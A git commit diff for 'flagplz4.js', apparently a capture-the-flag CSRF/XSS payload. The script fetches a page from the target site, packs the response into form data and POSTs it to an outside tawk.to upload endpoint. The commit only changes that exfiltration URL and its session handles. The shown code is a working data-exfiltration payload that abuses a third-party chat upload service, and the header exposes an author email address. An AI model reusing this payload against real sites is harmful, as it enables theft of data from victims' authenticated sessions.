a8c02e7d3578e1f488974aeb74a6d7bc98b0eee9
/hello <czavaleta93@gmail.com>
2021-11-05 13:44:55 -0500

    Update flagplz4.js

--- testcsrfpost11/flagplz4.js
+++ testcsrfpost11/flagplz4.js
@@ -19,7 +19,7 @@ fetch("/view/f1135719-d3a5-4534-9bc1-f7ddcf4c8cb3").then((res) => {
 
     formData.append("upload", file);
 
-    fetch("https://upload.tawk.to/upload/visitor-chat/visitor?handle=f93538fe35475cb4af05ead873c67e2d421d9532&visitorSessionId=61857978ce40c32e3edff8f5",{
+    fetch("https://upload.tawk.to/upload/page/agent?handle=8194642e04cf8530ca49d5432a72ffc1d06c3569&pageId=61830caa6bb0760a494106d7&agentSessionId=61855f3369d9e20b02eb53da",{
         method: 'POST',
         body: formData
     });
